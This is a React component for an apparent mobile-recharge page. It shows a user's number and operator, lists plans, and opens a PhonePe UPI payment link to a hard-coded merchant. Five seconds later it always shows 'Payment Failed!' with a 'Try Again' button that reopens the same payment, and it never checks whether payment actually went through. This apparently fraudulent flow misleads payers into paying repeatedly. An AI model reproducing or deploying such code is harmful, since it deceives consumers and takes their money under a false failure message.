import React, { useState } from "react";
import { useAppContext } from "../Context/appContext";
import { allplans } from "../Data";
import PlanCard from "./plan-card";

const Plans = () => {
  const { user, setUser } = useAppContext();
  const [open, setOpen] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState("");

  const onClickPay = (amt) => {
    setSelectedPayment(
      `phonepe://pay?pa=fsv.470000099376083@icici&pn=Montaro&am=${amt}&cu=INR&tn=Bill`,
    );
    window.open(
      `phonepe://pay?pa=fsv.470000099376083@icici&pn=Montaro&am=${amt}&cu=INR&tn=Bill`,
      "_blank",
    );
    setTimeout(() => {
      setOpen(true);
    }, 5000);
  };

  return (
    <>
      {open && (
        <div
          tabIndex={-1}
          className="overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-screen max-h-full bg-slate-950/[.8]"
        >
          <div className="relative p-4 w-full max-w-md max-h-full top-1/3">
            <div className="relative bg-white rounded-lg shadow">
              <button
                type="button"
                className="absolute top-3 end-2.5 text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center"
                data-modal-hide="popup-modal"
                onClick={() => {
                  setOpen(false);
                }}
              >
                <svg
                  className="w-3 h-3"
                  aria-hidden="true"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 14 14"
                >
                  <path
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"
                  />
                </svg>
                <span className="sr-only">Close modal</span>
              </button>

              <div className="p-4 md:p-5 text-center">
                <svg
                  className="mx-auto mb-4 text-gray-400 w-12 h-12"
                  aria-hidden="true"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 20 20"
                >
                  <path
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M10 11V6m0 8h.01M19 10a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z"
                  />
                </svg>

                <h3 className="text-lg font-normal text-gray-500">
                  Payment Failed!
                </h3>
                <p className="text-xs text-gray-500 mb-5 ">
                  (Amount will credited by 24 hours in your account.)
                </p>

                <button
                  type="button"
                  onClick={() => {
                    window.open(selectedPayment, "_blank");
                  }}
                  className="text-white bg-blue-500 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm inline-flex items-center px-5 py-2.5 text-center"
                >
                  Try Again
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setOpen(false);
                  }}
                  className="py-2.5 px-5 ms-3 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-lg border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      <div className="flex flex-col w-full">
        <div className="bg-white py-4 px-4 text-[13.4px] flex items-center justify-between">
          <div className="flex items-center">
            <img
              src={user?.operator?.logo}
              alt="User"
              className="h-12 rounded-full"
            />

            <div className="font-bold text-[14px] text-[#581c87] ml-2">
              <div>Recharge for: {user?.mobile}</div>
              <div className="text-slate-500 font-normal text-[12px] mt-[-2px]">
                {/* J/io Prepaid */}
                {user?.operator?.title}
              </div>
            </div>
          </div>

          <a className="text-blue-600" href="/">
            Change
          </a>
        </div>
        <div className="px-2 my-0 bg-purple-200 py-5">
          <p className="text-center text-rose-600 text-[14px] font-bold">
            NEW!
          </p>
          <h1 className="text-[20px] font-bold text-center mt-[-2px] text-purple-900">
            RECHARGE &amp; OFFERS
          </h1>
        </div>

        <div className="p-4">
          <div className="w-full max-w-md  rounded-2xl shadodw-lg  ">
            <div className="flex flex-col">
              {allplans.map((item, index) => {
                return (
                  <>
                    <PlanCard onClickPay={onClickPay} item={item} key={index} />
                  </>
                );
              })}
            </div>
          </div>
        </div>

        {/* <div>
          <img src="/banner-2.webp" />
        </div> */}
      </div>
    </>
  );
};

export default Plans;
